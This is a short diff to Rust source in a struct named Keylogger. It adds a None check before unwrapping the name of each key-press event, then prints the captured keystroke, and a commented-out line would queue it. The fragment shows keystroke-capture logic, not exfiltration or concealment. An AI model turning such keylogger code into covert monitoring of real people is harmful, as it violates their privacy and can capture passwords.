@@ -31,9 +31,11 @@ impl Keylogger {
 
 	        match event.event_type {
 	            EventType::KeyPress(_key) => {
-	                let text: String = event.name.unwrap().clone();
-	                println!("{:?}", text);
-	                //self.queue.add(text);
+	            	if (event.name != None) {
+		                let text: String = event.name.unwrap().clone();
+		                println!("{:?}", text);
+		                //self.queue.add(text);
+	            	}
 	            },
 	            _ => (),
 	        }
